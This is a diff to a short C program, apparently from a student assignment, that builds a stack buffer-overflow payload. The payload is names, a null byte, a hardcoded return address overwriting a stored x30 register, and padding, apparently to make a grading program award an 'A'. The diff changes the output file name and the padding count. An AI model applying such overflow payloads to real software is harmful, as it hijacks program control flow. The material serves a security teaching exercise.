@@ -19,7 +19,7 @@ int main(void)
 {
     int i;
     unsigned long ulData = 0x420068;   // Address of A instruction
-    psFILE = fopen("dataB", "w");
+    psFILE = fopen("dataA", "w");
     fprintf(psFILE, "Ariel & Grace");   // Write our names to file
     fprintf(psFILE, "%c", '\0');     // Write null byte after name
     
@@ -27,8 +27,8 @@ int main(void)
     // Overwrite getName's stored x30 w/ instruction to get a A
     fwrite(&ulData, sizeof(unsigned long), 1, psFILE);
 
-    // Write padding of 34 characters to overrun stack
-    for (i = 0; i < 17; i++)
+    // Write padding of 16(?) characters to overrun stack
+    for (i = 0; i < 16; i++)
     {
         fprintf(psFILE, "%c", 'a');
     }
